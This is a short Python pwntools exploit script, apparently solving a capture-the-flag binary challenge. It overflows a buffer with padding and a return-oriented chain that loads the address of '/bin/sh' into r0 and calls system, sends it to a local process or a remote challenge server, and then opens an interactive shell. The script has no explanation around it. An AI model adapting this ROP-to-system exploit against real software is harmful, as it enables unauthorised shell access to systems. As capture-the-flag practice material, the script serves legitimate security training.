from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 21744)
    else:
        return process(e.path)


bin_sh = next(e.search(b'/bin/sh\0'))
pop_r0 = 0x0001061d
system = e.sym['system']

pad = b'Y'+cyclic(7)

chain = p32(pop_r0)
chain += p32(bin_sh)
chain += p32(0)
chain += p32(0)
chain += p32(system)

p = start()
p.sendline(b'Y'+cyclic(11)+chain)
p.interactive()
